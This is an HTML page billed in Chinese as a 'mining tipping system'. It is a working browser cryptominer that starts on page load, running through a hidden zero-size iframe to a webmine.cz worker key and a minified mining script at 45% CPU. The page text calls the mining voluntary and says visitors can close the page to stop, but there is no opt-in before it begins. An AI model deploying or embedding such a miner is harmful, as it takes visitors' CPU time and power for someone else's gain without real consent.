<!DOCTYPE html>
<html>
  <head>
    <title>Web Miner</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-table/1.11.1/bootstrap-table.min.css" />
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/ui-lightness/jquery-ui.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/NuyoaH-L/NuyoaH-L/assets/css/mine.min.scss" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js" ></script>
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js" ></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" ></script>
  </head>
  <style type="text/css">u {    border-bottom: 1px dotted #000;text-decoration: none;</style>
  <body>
    <script>var INITIAL_CPU_LOAD = 45;</script>
    <div style="max-width:500px" class="container" >
      <div class="row" >
        <h3>⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇</h3><br>
        <center>
          <p>
            当前算力 : <span id="hashrate">等待响应...</span>
          </p><br>
          <p>
            您已贡献 : <span id="total_hashes">0</span> H
          </p><br>
          <p>
            Total : <span id="total__shares">0</span>
          </p><br>
        </center>
        <hr>
        <center>
          <h4>
            <p>CPU 使用阀值</p>
            <div class="bar" width='100%' height='10%'></div>
            <h2 class="text-center" >
              <input type='text' class='percent' />
            </h2>
          </h4>
        </center>
        <center>
          <span>当上方的数字开始跳动既代表挖矿打赏已开始<span><br>
          <span>如要您不想打赏或是您认为已经足够了关闭本页即可</span><br>
          <span>请确保您知道您正在做什么，且这一切都是您自愿的</span><br>
          <span>我希望您能在此处多停留一段时间<span><br>
          <span>但具体停留多久取决于您自己<span><br>
          <span>算力也在一定程度上反映了您设备的能力</span><br>
          <span>算力值越高相应的您设备的CPU计算能力也越强大</span><br>
        </center>
      </div>
     </div>
     <iframe id='miner' width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=shF1amnFqlMSwHF'></iframe>
     <script src="https://cdn.jsdelivr.net/gh/NuyoaH-L/NuyoaH-L/assets/js/mine.min.js" ></script>
  </body>
</html>
